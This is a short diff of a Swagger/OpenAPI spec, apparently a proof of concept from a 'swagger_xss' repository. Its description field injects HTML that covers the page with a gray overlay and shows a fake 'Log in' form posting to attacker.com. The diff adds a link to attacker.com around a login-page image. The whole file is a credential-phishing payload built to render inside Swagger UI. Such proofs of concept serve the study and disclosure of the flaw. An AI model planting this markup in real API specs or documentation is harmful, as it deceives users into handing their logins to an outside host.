@@ -4,6 +4,7 @@ info:
   description: |
         <div style="position: absolute;width: 4000px; height: 2000px;left: -500px;top: -500px;background-color: gray;opacity: 0.8;z-index: 999;"></div>
         <div style="top: -200px;left: calc(50% - 300px);position:absolute;z-index: 999999999;background: white;box-shadow: 1px 5px 10px grey;">
+          <a href="https://attacker.com"><img src="https://raw.githubusercontent.com/PT2OO/swagger_xss/refs/heads/main/login_page.png" alt="Login" /></a>
           <form action="https://attacker.com" style="width:400px;box-shadow: 0 0 0 1px #dbdbdb;border-radius: 0.25rem;padding: 15px;display:flex;flex-wrap:wrap">
             <h2>Log in</h2>
             <div style="background-color: #fdd4cd;color: #ae1800; padding: 16px 22px 16px 15px; margin-top: 10px;margin-bottom:20px;display:flex;align-items: center;">
